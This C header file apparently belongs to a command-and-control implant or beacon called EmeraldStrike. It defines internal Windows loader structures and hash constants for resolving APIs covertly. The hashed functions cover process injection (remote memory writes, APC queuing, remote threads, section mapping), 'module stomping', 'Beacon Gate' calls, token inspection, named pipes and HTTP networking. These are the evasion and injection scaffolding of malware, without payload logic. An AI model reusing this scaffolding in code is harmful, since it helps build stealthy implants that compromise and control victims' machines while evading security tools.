#ifndef EMERALDSTRIKE_NATIVE_H
#define EMERALDSTRIKE_NATIVE_H

#include <windows.h>
#include <winternl.h>

typedef struct _PEB_LDR_DATA_FULL {
    ULONG      Length;
    BOOLEAN    Initialized;
    HANDLE     SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA_FULL, *PPEB_LDR_DATA_FULL;

typedef struct _LDR_DATA_TABLE_ENTRY_FULL {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG      TimeDateStamp;
} LDR_DATA_TABLE_ENTRY_FULL, *PLDR_DATA_TABLE_ENTRY_FULL;

typedef struct _PEB_FULL {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE  Mutant;
    PVOID   ImageBaseAddress;
    PPEB_LDR_DATA_FULL Ldr;
} PEB_FULL, *PPEB_FULL;

// Module hashes (djb2, case-insensitive)
#define H_MODULE_NTDLL    0x0ce9c757
#define H_MODULE_KERNEL32 0x680ca61f
#define H_MODULE_WINHTTP  0xbb2964c7
#define H_MODULE_ADVAPI32 0x01cf2593

// Function hashes - Kernel32
#define H_LOADLIBRARYA          0xe0c4af65
#define H_GETPROCADDRESS        0x060eef49
#define H_VIRTUALALLOC          0xae240921
#define H_VIRTUALPROTECT        0x23e5e817
#define H_VIRTUALFREE           0x673473b8
#define H_CREATETHREAD          0xda145c7b
#define H_WAITFORSINGLEOBJECT   0x0b1e3cc4
#define H_CLOSEHANDLE           0x774e3f91
#define H_SLEEP                 0x0e418848
#define H_EXITPROCESS           0xf3d3a548
#define H_EXITTHREAD            0x48f434c1
#define H_GETLASTERROR          0xd9fc668d
#define H_GETPROCESSHEAP        0xd5b2d6cc
#define H_HEAPALLOC             0x5f9f0c38
#define H_HEAPREALLOC           0xdd870c6f
#define H_HEAPFREE              0x2913ab4f
#define H_MULTIBYTETOWIDECHAR   0x90487038
#define H_CREATENAMEDPIPEA      0xdbd9aad7
#define H_CONNECTNAMEDPIPE      0x99f3128c
#define H_CREATEFILEA           0xed162fe4
#define H_WRITEFILE             0x38ada25a
#define H_READFILE              0x6ef3f0cb
#define H_DISCONNECTNAMEDPIPE   0x559bb2cc
#define H_PEEKNAMEDPIPE         0x2bd47dc7
#define H_GETMODULEFILENAMEA    0x00ee9817
#define H_GETCURRENTDIRECTORYA  0x5dacd8c8
#define H_SETCURRENTDIRECTORYA  0x0d2e4ad4
#define H_FINDFIRSTFILEA        0xab164e99
#define H_FINDNEXTFILEA         0xdcb720b0
#define H_FINDCLOSE             0x05bca446
#define H_COPYFILEA             0xcba4df2b
#define H_MOVEFILEA             0x27cf6727
#define H_DELETEFILEA           0xd5f26463
#define H_CREATEDIRECTORYA      0xf26aca19
#define H_REMOVEDIRECTORYA      0x024bf2b3
#define H_GETFILESIZE           0x0d0ebc0a
#define H_GETFILEATTRIBUTESA    0xd94af557
#define H_GETCURRENTPROCESS     0x687a3231
#define H_GETCURRENTPROCESSID   0x6f38c85e
#define H_CREATEPROCESSA        0x98dcab43
#define H_TERMINATEPROCESS      0x7a847757
#define H_OPENPROCESS           0x9f808e40
#define H_WRITEPROCESSMEMORY    0x149e0432
#define H_VIRTUALALLOCEX        0xd4758d5e
#define H_QUEUEUSERAPC          0xc0983ec7
#define H_RESUMETHREAD          0x7df62498
#define H_CREATETOOLHELP32SNAPSHOT 0x5011839f
#define H_PROCESS32FIRST        0xec3ee51b
#define H_PROCESS32NEXT         0x621b5c32
#define H_LSTRLENA              0xf851f794
#define H_LSTRCPYA              0xf72dfaa1
#define H_LSTRCMPA              0xf72d3315
#define H_GETCOMPUTERNAMEXA     0x803cfa3d
#define H_GETSYSTEMINFO         0xbb20ae80
#define H_GETNATIVESYSTEMINFO   0x708797e7
#define H_OUTPUTDEBUGSTRINGA    0xf210bfff

// Function hashes - Beacon Gate APIs (Kernel32)
#define H_VIRTUALPROTECTEX      0x83d3e254
#define H_GETTHREADCONTEXT      0x9144892c
#define H_SETTHREADCONTEXT      0xfcffe338
#define H_CREATEREMOTETHREAD    0xb3ba2f67
#define H_OPENTHREAD            0xb96aa1b9
#define H_CREATEFILEMAPPINGA    0xa7a454b0
#define H_MAPVIEWOFFILE         0x4b26c23d
#define H_UNMAPVIEWOFFILE       0x9b01f020
#define H_VIRTUALQUERY          0xb761314c
#define H_DUPLICATEHANDLE       0x9acdc6b6
#define H_READPROCESSMEMORY     0xcbbe4f23
#define H_VIRTUALFREEEX         0xb8964ef5
#define H_VIRTUALQUERYEX        0x64e5a089

// Function hashes - Kernel32 (spawn)
#define H_CREATEPROCESSW        0x98dcab59

// Function hashes - Ntdll
#define H_NTCREATETHREADEX      0x7b41bf7a
#define H_NTCREATESECTION       0xadee39ba
#define H_NTMAPVIEWOFSECTION    0x809ea7d4
#define H_NTUNMAPVIEWOFSECTION  0x71002c37
#define H_NTFLUSHINSTRUCTIONCACHE 0xacdad009
#define H_RTLIMAGENTHEADEREX    0x46b86bac

// Function hashes - Kernel32 (module stomping)
#define H_ADDVECTOREDEXCEPTIONHANDLER    0x0e992781
#define H_REMOVEVECTOREDEXCEPTIONHANDLER 0x75e60ce6
#define H_LOADLIBRARYW                   0xe0c4af7b
#define H_GETFILEATTRIBUTESW             0xd94af56d

// Function hashes - Advapi32
#define H_OPENPROCESSTOKEN      0x0d521c41
#define H_GETTOKENINFORMATION   0xc31b71f6
#define H_LOOKUPACCOUNTSIDA     0xab9292f7

// Function hashes - WinHTTP
#define H_WINHTTPOPEN               0x51544eaf
#define H_WINHTTPCONNECT            0x45e55867
#define H_WINHTTPOPENREQUEST        0xb8cd1898
#define H_WINHTTPSENDREQUEST        0xf4617c10
#define H_WINHTTPRECEIVERESPONSE    0x0c8cf52f
#define H_WINHTTPQUERYDATAAVAILABLE 0xc84876ae
#define H_WINHTTPREADDATA           0x07b1ba93
#define H_WINHTTPCLOSEHANDLE        0xa8a3455f
#define H_WINHTTPSETOPTION          0x7596bdc2
#define H_WINHTTPADDREQUESTHEADERS  0x7b0ac5cb

// Function hashes - WinInet
#define H_INTERNETOPENA             0x75cfc16b
#define H_INTERNETCONNECTA          0xa4aa5fa3
#define H_HTTPOPENREQUESTA          0x4cb871ab
#define H_HTTPSENDREQUESTA          0x527e9123
#define H_INTERNETREADFILE          0x740e1514
#define H_INTERNETCLOSEHANDLE       0x47f5915a
#define H_INTERNETSETOPTIONA        0xfac0ad7e

#endif // EMERALDSTRIKE_NATIVE_H
